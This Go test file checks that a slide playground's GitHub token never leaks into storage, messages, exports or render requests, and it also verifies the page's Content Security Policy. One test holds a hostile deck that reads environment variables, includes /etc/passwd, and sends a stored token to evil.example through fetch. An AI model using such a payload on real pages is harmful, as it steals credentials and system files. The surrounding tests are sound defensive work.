package playground

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/go-browserhttp/browsergit/remote"
	"github.com/go-browserhttp/browsergit/secret"
	"github.com/go-slides/go-slides.github.io/playground/store"
	"github.com/go-slides/go-slides.github.io/playground/versions"
	"github.com/go-widgets/toolkit"
)

// planted is the token every test types. It is not shaped like a real one: a
// realistic secret in a test file is one copy-paste away from being treated as
// a real one.
const planted = "GITHUB-TOKEN-PLACEHOLDER-0123456789"

// fakeForge is a GitHub repository in memory, behind remote.Remote.
type fakeForge struct {
	files    map[string]string // the default branch's tip, by repository path
	commit   int
	branches map[string]bool
	proposed []remote.Proposal
	sent     []remote.Files
	fail     error // every call fails with it
}

func (f *fakeForge) head() string { return fmt.Sprintf("%040x", f.commit) }

func (f *fakeForge) Load(_ context.Context, repo, ref, dir string) (remote.Files, remote.Base, error) {
	if f.fail != nil {
		return nil, remote.Base{}, f.fail
	}
	if ref == "" {
		ref = "main"
	}
	b := remote.Base{Forge: "github", Repo: repo, Ref: ref, Dir: dir, Commit: f.head(), Blobs: map[string]string{}}
	files := remote.Files{}
	for p, c := range f.files {
		if rel, ok := remote.Rel(dir, p); ok {
			files[rel] = []byte(c)
			b.Blobs[rel] = remote.BlobID([]byte(c))
		}
	}
	return files, b, nil
}

func (f *fakeForge) Propose(_ context.Context, base remote.Base, files remote.Files, p remote.Proposal) (remote.Result, error) {
	if f.fail != nil {
		return remote.Result{}, f.fail
	}
	if err := remote.CheckProposal(base, p, "main"); err != nil {
		return remote.Result{}, err
	}
	if f.branches[p.Branch] {
		return remote.Result{}, remote.ErrBranchExists
	}
	f.branches[p.Branch] = true
	f.proposed = append(f.proposed, p)
	f.sent = append(f.sent, files)
	return remote.Result{Branch: p.Branch, Commit: f.head(), URL: "https://github.com/o/r/pull/1"}, nil
}

func (f *fakeForge) Refresh(ctx context.Context, base remote.Base) (remote.Files, remote.Base, error) {
	if f.fail != nil {
		return nil, remote.Base{}, f.fail
	}
	if base.Commit == f.head() {
		return nil, base, nil
	}
	return f.Load(ctx, base.Repo, base.Ref, base.Dir)
}

// gitTab is a page with the GitHub pane: a store, a journal, a prompt, the
// forge, and a device that can remember a token.
type gitTab struct {
	*promptTab
	forge  *fakeForge
	tokens []string // what GitRemote was given: the one place a token may go
	forges []string // and for which forge
	kept   string   // what "Remember on this device" holds,
	keptForge,
	keptOrigin string // and the forge and the API origin it was kept for
	journal  []string
	remoteOK bool
	gd       *fakeGitd // slides-gitd, when the page is served behind one (gitdvm_test.go)
	signIns  int
	front    bool         // the page is served by a slides-gitd front (the marker)
	hold     bool         // the host asks to hold the stored project (HoldStorage)
	park     *[][2]func() // when set, GitRun parks its operations here
}

func (g *gitTab) GitRemote(forge string, tok secret.Token) (remote.Remote, error) {
	g.tokens = append(g.tokens, tok.Reveal())
	g.forges = append(g.forges, forge)
	if !g.remoteOK {
		return nil, errors.New("refused " + tok.Reveal()) // a careless layer echoing it
	}
	return g.forge, nil
}
func (g *gitTab) GitRun(op func(), done func()) {
	if g.park != nil { // a network that has not answered yet
		*g.park = append(*g.park, [2]func(){op, done})
		return
	}
	op()
	done()
}
func (g *gitTab) GitOrigin(forge string) string {
	if forge == "gitlab" {
		return "https://gitlab.com"
	}
	return "https://api.github.com"
}
func (g *gitTab) KeepToken(forge, origin string, tok secret.Token) {
	g.kept, g.keptForge, g.keptOrigin = tok.Reveal(), forge, origin
}
func (g *gitTab) KeptToken() (string, string, secret.Token) {
	return g.keptForge, g.keptOrigin, secret.New(g.kept)
}
func (g *gitTab) ForgetToken()                { g.kept, g.keptForge, g.keptOrigin = "", "", "" }
func (g *gitTab) JournalWrite(v string) error { g.journal = append(g.journal, v); return nil }
func (g *gitTab) JournalRead() (string, bool) { return "", false }
func (g *gitTab) JournalClear()               {}

func gitScene(t *testing.T, m *store.Memory, kept string) (*Scene, *ViewModel, *gitTab) {
	t.Helper()
	if kept == "" {
		return gitSceneKept(t, m, "", "", "")
	}
	// a token kept by an earlier page, for GitHub
	return gitSceneKept(t, m, kept, "github", "https://api.github.com")
}

// gitSceneKept is a page opened on a device that holds token, kept for forge and
// origin (all empty: nothing kept).
func gitSceneKept(t *testing.T, m *store.Memory, kept, keptForge, keptOrigin string) (*Scene, *ViewModel, *gitTab) {
	t.Helper()
	return gitSceneHost(t, m, kept, keptForge, keptOrigin, func(h *gitTab) Host { return h })
}

// gitSceneHost is gitSceneKept with the host the view-model and the scene are
// given made from the harness (a wrapper that adds a capability, say).
func gitSceneHost(t *testing.T, m *store.Memory, kept, keptForge, keptOrigin string, host func(*gitTab) Host) (*Scene, *ViewModel, *gitTab) {
	t.Helper()
	SetupText(1)
	h := &gitTab{
		promptTab: &promptTab{filesTab: &filesTab{tab: &tab{fakeHost: newHost(), answer: true}, saved: map[string][]byte{}}},
		forge: &fakeForge{files: map[string]string{
			"README.md":           "# repo",
			"talk/deck.md":        "---\ntheme: default\n---\n\n# From GitHub\n",
			"talk/media/logo.svg": "<svg xmlns='http://www.w3.org/2000/svg'/>",
		}, branches: map[string]bool{}},
		kept:     kept,
		remoteOK: true,
	}
	h.keptForge, h.keptOrigin = keptForge, keptOrigin
	h.st = store.New(m, NewTabID(), load(m, DraftProject), load(m, PreviousProject), load(m, UIProject))
	tr := &fakeTransport{}
	vm := NewViewModel(tr, host(h), "")
	tr.vm = vm
	answer(tr, vm)
	vm.drafts.now = func() time.Time { return time.Date(2026, 11, 1, 10, 0, 0, 0, time.UTC) }
	s := NewScene(vm, host(h), 1600, 900)
	return s, vm, h
}

// everything is every string the page wrote, sent or showed anywhere a token
// must never be: the stored projects and versions (all of the Memory), the
// journal, the URL fragment, every download, the clipboard, every patch sent
// to the preview frame, every request sent to the render worker, the status
// line and the pane's note.
func everything(t *testing.T, m *store.Memory, h *gitTab, vm *ViewModel, tr []Request, seen []string) string {
	t.Helper()
	var b strings.Builder
	for _, n := range m.Names() {
		p := load(m, n)
		if p == nil {
			continue
		}
		for k, v := range p.UI {
			b.WriteString(k + "=" + v + "\n")
		}
		for _, k := range p.Paths() {
			d, _ := p.Read(k)
			b.Write(d)
			b.WriteString("\n")
		}
	}
	b.WriteString(strings.Join(h.journal, "\n"))
	b.WriteString(h.fragment + h.clip + h.opened)
	for k, v := range h.downloads {
		b.WriteString(k + v)
	}
	for k, v := range h.saved {
		b.WriteString(k + string(v))
	}
	for _, p := range h.patches {
		j, _ := json.Marshal(p)
		b.Write(j)
	}
	for _, r := range tr {
		j, _ := json.Marshal(r)
		b.Write(j)
	}
	b.WriteString(strings.Join(seen, "\n"))
	b.WriteString(vm.Status.Get() + vm.GitNote.Get() + vm.Doc.Get() + vm.RailDoc.Get())
	return b.String()
}

// leaked reports whether s carries the token, raw or base64-encoded.
func leaked(s string) bool {
	return strings.Contains(s, planted) ||
		strings.Contains(s, base64.StdEncoding.EncodeToString([]byte(planted))) ||
		strings.Contains(s, base64.RawURLEncoding.EncodeToString([]byte(planted)))
}

func TestTheTokenGoesOnlyToTheForgeClient(t *testing.T) {
	m := store.NewMemory()
	_, vm, h := gitScene(t, m, "")
	tr := vm.transport.(*fakeTransport)
	var seen []string
	vm.Status.Subscribe(func(s string) { seen = append(seen, s) })
	vm.GitNote.Subscribe(func(s string) { seen = append(seen, s) })

	// The whole journey: connect, load, edit, propose, someone else pushes,
	// check, take theirs, share, export, keep a version.
	vm.GitPane.Set(true)
	vm.GitRepo.Set("o/r")
	vm.GitDir.Set("talk")
	vm.GitToken.Set("  " + planted + "\n")
	vm.GitConnect.Execute()
	if vm.GitToken.Get() != "" || !vm.GitConnected.Get() {
		t.Fatal("Connect must take the token and empty the field")
	}
	if len(h.tokens) != 1 || h.tokens[0] != planted {
		t.Fatalf("GitRemote got %v", h.tokens)
	}
	vm.GitLoad.Execute()
	if !strings.Contains(vm.Source.Get(), "From GitHub") || vm.git.base == nil || vm.git.base.Dir != "talk" {
		t.Fatalf("load: %q %+v", vm.Source.Get(), vm.git.base)
	}
	answer(tr, vm)
	vm.Source.Set(vm.Source.Get() + "\n---\n\n# Mine\n")
	answer(tr, vm)
	h.name = "Add a slide"
	vm.GitPropose.Execute()
	if len(h.forge.proposed) != 1 {
		t.Fatalf("proposed %v (note %q)", h.forge.proposed, vm.GitNote.Get())
	}
	p := h.forge.proposed[0]
	if p.Title != "Add a slide" || !strings.HasPrefix(p.Branch, "slides/add-a-slide-") {
		t.Fatalf("proposal %+v", p)
	}
	if vm.GitLink.Get() != "https://github.com/o/r/pull/1" {
		t.Fatalf("link %q", vm.GitLink.Get())
	}
	vm.GitOpenLink.Execute()
	if h.opened != "https://github.com/o/r/pull/1" {
		t.Fatal("Open the pull request")
	}
	h.forge.files["talk/deck.md"] = "# Theirs\n"
	h.forge.commit++
	vm.GitRefresh.Execute()
	if vm.Compare.Get() == nil || !vm.GitTakeTheirs.CanExecute() {
		t.Fatalf("refresh did not compare (note %q)", vm.GitNote.Get())
	}
	vm.GitTakeTheirs.Execute()
	answer(tr, vm)
	if vm.Source.Get() != "# Theirs\n" || vm.git.base.Commit != h.forge.head() {
		t.Fatal("Take theirs must load the new tip and move the base")
	}
	vm.Share.Execute()
	vm.downloadZip()
	vm.Download.Execute()
	vm.saveUI()

	all := everything(t, m, h, vm, tr.sent, seen)
	if leaked(all) {
		t.Fatal("the token reached storage, a share link, an export, the worker, the preview or the screen")
	}
	// The control: the same sweep sees a value when it is there.
	if !strings.Contains(all, "# Theirs") || !strings.Contains(all, "o/r") || !strings.Contains(all, "git-base") {
		t.Fatal("control: the sweep should see the deck, the repository and the stored base")
	}
	if h.kept != "" {
		t.Fatal("nothing may be remembered without the person's choice")
	}
	// No environment variable either: a deck's {{ env }} reads the process's.
	for _, kv := range os.Environ() {
		if strings.Contains(kv, planted) {
			t.Fatal("the token is in the environment")
		}
	}
	if k := kinds(vm); len(k) == 0 || !containsKind(k, versions.Git) {
		t.Fatalf("a load keeps a git version: %v", k)
	}
}

func containsKind(ks []versions.Kind, k versions.Kind) bool {
	for _, x := range ks {
		if x == k {
			return true
		}
	}
	return false
}

func TestRememberIsTheOnlyWayToKeepAToken(t *testing.T) {
	m := store.NewMemory()
	_, vm, h := gitScene(t, m, "")
	vm.GitRemember.Set(true)
	vm.GitToken.Set(planted)
	vm.GitConnect.Execute()
	if h.kept != planted || vm.GitNote.Get() != T(KGitNoteRemember) {
		t.Fatalf("kept %q, note %q", h.kept, vm.GitNote.Get())
	}
	// The next page connects by itself, from the device only.
	_, vm2, h2 := gitScene(t, m, h.kept)
	if !vm2.GitConnected.Get() || len(h2.tokens) != 1 {
		t.Fatal("a remembered token must connect the next page")
	}
	// Unticking forgets at once; so does Disconnect; so does Forget my drafts.
	vm2.GitRemember.Set(false)
	if h2.kept != "" {
		t.Fatal("unticking Remember must forget")
	}
	h2.kept = planted
	vm2.GitDisconnect.Execute()
	if h2.kept != "" || vm2.GitConnected.Get() || vm2.git.token.Reveal() != "" {
		t.Fatal("Disconnect must forget, here and on the device")
	}
	h2.kept = planted
	vm2.ForgetDrafts()
	if h2.kept != "" {
		t.Fatal("Forget my drafts must forget the token too")
	}
	// A token kept while the stored choice says No is dropped, not used.
	_, vm3, h3 := gitScene(t, m, planted)
	if vm3.GitConnected.Get() || h3.kept != "" || len(h3.tokens) != 0 {
		t.Fatal("a stray kept token must be dropped")
	}
	if leaked(everything(t, m, h3, vm3, nil, nil)) {
		t.Fatal("the remembered token reached the page's storage")
	}
}

func TestEveryMessageIsRedacted(t *testing.T) {
	m := store.NewMemory()
	_, vm, h := gitScene(t, m, "")
	var seen []string
	vm.Status.Subscribe(func(s string) { seen = append(seen, s) })
	vm.GitNote.Subscribe(func(s string) { seen = append(seen, s) })

	// A refusal that echoes the token, at connect...
	h.remoteOK = false
	vm.GitToken.Set(planted)
	vm.GitConnect.Execute()
	if vm.GitConnected.Get() {
		t.Fatal("a refused remote must not connect")
	}
	// ...and errors from every call that echo it.
	h.remoteOK = true
	vm.GitToken.Set(planted)
	vm.GitConnect.Execute()
	vm.GitRepo.Set("o/r")
	vm.GitDir.Set("talk")
	vm.GitLoad.Execute()
	h.forge.fail = fmt.Errorf("401 Bad credentials: Authorization: Bearer %s / Basic %s", planted, base64.StdEncoding.EncodeToString([]byte("git:"+planted)))
	vm.GitLoad.Execute()
	vm.GitPropose.Execute()
	vm.GitRefresh.Execute()
	all := strings.Join(seen, "\n")
	if leaked(all) {
		t.Fatalf("a message carried the token:\n%s", all)
	}
	if !strings.Contains(all, secret.Redacted) || !strings.Contains(all, "Bad credentials") {
		t.Fatalf("control: the messages should be there, redacted:\n%s", all)
	}
}

func TestAHostileDeckCannotReachTheToken(t *testing.T) {
	m := store.NewMemory()
	_, vm, h := gitScene(t, m, "")
	tr := vm.transport.(*fakeTransport)
	vm.GitToken.Set(planted)
	vm.GitConnect.Execute()
	// What a deck can do in the render: read the environment, include files,
	// read data, and ship whatever it found out in its own markup (which the
	// preview frame shows, and a share link or an export carries).
	hostile := "---\ntheme: default\n---\n\n# {{ env \"GITHUB_TOKEN\" }}{{ env \"TOKEN\" }}\n\n" +
		// (not {{ include "deck.md" }}: a deck that includes itself recurses
		// without bound in go-slides/slides v0.16.0 — an open defect there)
		"{{ include \"../token\" }}{{ include \"/etc/passwd\" }}{{ include \"media/logo.svg\" }}\n\n" +
		"<script>fetch('https://evil.example/?t='+localStorage.goSlidesGitHubToken)</script>\n"
	vm.Source.Set(hostile)
	answer(tr, vm)
	all := everything(t, m, h, vm, tr.sent, nil)
	if leaked(all) {
		t.Fatal("a hostile deck reached the token")
	}
	// The render request is all the worker ever gets: no field of it holds a token.
	for _, r := range tr.sent {
		j, _ := json.Marshal(r)
		if leaked(string(j)) {
			t.Fatal("a render request carried the token")
		}
	}
	_ = h
}

func TestGitStateSurvivesAReloadWithoutTheToken(t *testing.T) {
	m := store.NewMemory()
	_, vm, _ := gitScene(t, m, "")
	vm.GitToken.Set(planted)
	vm.GitConnect.Execute()
	vm.GitRepo.Set("o/r")
	vm.GitRef.Set("main")
	vm.GitDir.Set("talk")
	vm.GitLoad.Execute()
	_, vm2, h2 := gitScene(t, m, "")
	if vm2.GitRepo.Get() != "o/r" || vm2.GitDir.Get() != "talk" || vm2.git.base == nil || vm2.git.base.Repo != "o/r" {
		t.Fatalf("reload: repo %q dir %q base %+v", vm2.GitRepo.Get(), vm2.GitDir.Get(), vm2.git.base)
	}
	if vm2.GitConnected.Get() || len(h2.tokens) != 0 {
		t.Fatal("a reload without Remember must not be connected")
	}
}

func TestGitCommandsNeedAConnectionAndABase(t *testing.T) {
	m := store.NewMemory()
	s, vm, h := gitScene(t, m, "")
	if vm.GitLoad.CanExecute() || vm.GitPropose.CanExecute() || vm.GitRefresh.CanExecute() || vm.GitDisconnect.CanExecute() {
		t.Fatal("nothing but Connect before connecting")
	}
	vm.GitConnect.Execute()
	if vm.GitNote.Get() != T(KGitNoteNoToken) {
		t.Fatal("Connect without a token says so")
	}
	vm.GitToken.Set(planted)
	vm.GitConnect.Execute()
	if !vm.GitLoad.CanExecute() || vm.GitPropose.CanExecute() {
		t.Fatal("Load, not yet Propose")
	}
	// A folder without a deck is refused, and nothing changes.
	before := vm.Source.Get()
	vm.GitRepo.Set("o/r")
	vm.GitDir.Set("")
	vm.GitLoad.Execute()
	if vm.Source.Get() != before || !strings.Contains(vm.GitNote.Get(), DeckFile) {
		t.Fatalf("no deck: %q", vm.GitNote.Get())
	}
	// Up to date.
	vm.GitDir.Set("talk")
	vm.GitLoad.Execute()
	vm.GitRefresh.Execute()
	if vm.GitNote.Get() != T(KGitNoteUpToDate) {
		t.Fatalf("up to date: %q", vm.GitNote.Get())
	}
	// Undo takes the load back.
	vm.Undo.Execute()
	if vm.Source.Get() != before {
		t.Fatal("Undo must take the load back")
	}
	vm.GitPane.Set(true)
	s.layout()
	r := s.Rects()
	if _, ok := r["git-token"]; !ok {
		t.Fatal("the pane is laid out")
	}
	// the token field is masked: what a screen reader and the text runs read of it
	// is bullets, never the text
	vm.GitToken.Set("hunter2-typed-not-connected")
	bullets := false
	for _, n := range toolkit.WalkA11y(s.gitp) {
		if strings.Contains(n.Value, "hunter2") || strings.Contains(n.Name, "hunter2") {
			t.Fatalf("the token field shows its text: %+v", n)
		}
		bullets = bullets || strings.ContainsRune(n.Value, '•')
	}
	if !bullets {
		t.Fatal("the token field must be masked")
	}
	_ = h
}

func TestPlaygroundPageCSP(t *testing.T) {
	b, err := os.ReadFile("../layouts/_default/playground.html")
	if err != nil {
		t.Fatal(err)
	}
	page := string(b)
	const open = `<meta http-equiv="Content-Security-Policy" content="`
	i := strings.Index(page, open)
	if i < 0 {
		t.Fatal("the playground page has no Content Security Policy")
	}
	policy := page[i+len(open):]
	policy = policy[:strings.Index(policy, `"`)]
	directives := map[string]string{}
	for _, d := range strings.Split(policy, ";") {
		name, val, _ := strings.Cut(strings.TrimSpace(d), " ")
		directives[name] = val
	}
	// everything not named falls back to the page's own origin
	if directives["default-src"] != "'self'" {
		t.Errorf("default-src is %q, not 'self'", directives["default-src"])
	}
	// this page holds no forge token and calls no forge (the git frame does,
	// go-slides#90): connect-src is the page's own origin, and names no forge
	if directives["connect-src"] != "'self'" {
		t.Errorf("connect-src is %q: it must be the page only", directives["connect-src"])
	}
	if strings.Contains(policy, "api.github.com") || strings.Contains(policy, "gitlab.com") {
		t.Errorf("the policy names a forge: %q", policy)
	}
	// the one origin besides the page that may be framed is the git frame's,
	// which the template names once (and can override for a test build)
	if directives["frame-src"] != "'self' blob: {{ $fo }}" {
		t.Errorf("frame-src is %q: it must be the page, blob: and the git frame's origin", directives["frame-src"])
	}
	if !strings.Contains(page, `{{ $fo := default "https://go-slides-usercontent.github.io" site.Params.gitFrameOrigin }}`) {
		t.Error("the git frame's origin does not default to go-slides-usercontent.github.io")
	}
	if !strings.Contains(page, "globalThis.goSlidesGitFrameOrigin={{ $fo }};") {
		t.Error("the page does not tell the module the frame's origin")
	}
	// no object, no <base>, no form
	for name, want := range map[string]string{"object-src": "'none'", "base-uri": "'none'", "form-action": "'none'"} {
		if directives[name] != want {
			t.Errorf("%s is %q, not %s", name, directives[name], want)
		}
	}
	// scripts: the page and its inline script, and the wasm modules, but never eval
	if s := directives["script-src"]; !strings.Contains(s, "'wasm-unsafe-eval'") || strings.Contains(s, "'unsafe-eval'") || strings.Contains(s, " https:") || strings.Contains(s, "*") {
		t.Errorf("script-src is %q", s)
	}
	// frames and workers: no other host. (img-src, media-src, style-src and
	// font-src allow https: because the srcdoc preview frames inherit them and a
	// deck links such things; see the note in the page.)
	for _, name := range []string{"frame-src", "worker-src"} {
		if strings.Contains(directives[name], "https:") || strings.Contains(directives[name], "*") || strings.Contains(directives[name], "http:") {
			t.Errorf("%s is %q", name, directives[name])
		}
	}
	for _, name := range []string{"connect-src", "script-src", "frame-src", "worker-src", "object-src"} {
		if strings.Contains(directives[name], "http://") {
			t.Errorf("%s allows plain http: %q", name, directives[name])
		}
	}
	if j := strings.Index(page, `<meta name="referrer" content="no-referrer">`); j < 0 || j > strings.Index(page, "<script") {
		t.Fatal("no referrer may leave the page (a sign-in's code is in its URL until cleaned)")
	}
	if !strings.Contains(page, `<meta http-equiv="x-dns-prefetch-control" content="off">`) {
		t.Fatal("DNS prefetch must be off (go-slides#91)")
	}
	// before anything the page loads or runs
	for _, later := range []string{"<script", "<link", "{{ partial \"styles.html\""} {
		if j := strings.Index(page, later); j >= 0 && j < i {
			t.Fatalf("%s comes before the CSP", later)
		}
	}
	if strings.Count(page, "Content-Security-Policy") != 1 {
		t.Fatal("one policy only")
	}
}
